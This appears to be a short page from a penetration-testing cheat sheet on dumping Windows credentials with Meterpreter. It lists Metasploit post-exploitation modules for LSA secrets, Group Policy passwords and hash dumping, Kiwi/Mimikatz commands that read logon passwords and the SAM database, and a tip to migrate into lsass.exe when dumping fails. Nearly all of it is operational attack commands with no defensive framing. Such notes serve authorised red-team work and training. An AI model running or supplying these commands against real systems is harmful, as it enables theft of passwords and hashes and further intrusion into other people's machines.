# Meterpreter

{% hint style="info" %}
#### Some times dumping the hashes with `hashdump` or `creds_all` commands wont work. in this case, consider migrating to lsass.exe process and try dumping again.
{% endhint %}

### <mark style="color:orange;">Meterpreter Modules</mark>

```
post/windows/manage/wdigest_caching

post/windows/gather/lsa_secrets

post/windows/gather/credentials/gpp

post/windows/gather/lsa_secrets

post/windows/gather/smart_hashdump
```

### <mark style="color:orange;">kiwi</mark>

```
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
```

### <mark style="color:orange;">hashdump</mark>

```
meterpreter > hashdump
```
